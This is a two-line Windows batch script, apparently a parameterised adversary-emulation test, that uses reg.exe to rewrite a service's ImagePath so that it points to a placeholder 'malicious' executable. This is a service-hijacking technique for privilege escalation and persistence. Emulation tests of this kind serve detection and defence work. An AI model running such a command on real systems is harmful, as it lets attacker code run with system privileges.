@echo off
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /f /v ImagePath /d "#{malicious_service_path}"